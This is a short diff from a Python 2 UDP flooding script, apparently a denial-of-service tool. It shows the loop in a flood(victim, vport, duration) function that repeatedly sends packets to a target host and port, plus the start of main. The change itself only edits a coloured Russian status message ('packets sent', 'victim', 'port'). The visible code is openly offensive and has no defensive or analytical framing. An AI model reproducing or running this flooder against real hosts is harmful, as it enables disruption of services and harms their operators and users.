@@ -32,7 +32,7 @@ def flood(victim, vport, duration):
             pass    
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mНапрвалено пакетов \033[1;32m%s \033[1;91mЖертва \033[1;32m%s \033[1;91Port: \033[1;32m%s "%(sent, victim, vport)
+        print "\033[1;91mНапрвалено пакетов \033[1;32m%s \033[1;91mЖертва \033[1;32m%s \033[1;91mПорт: \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
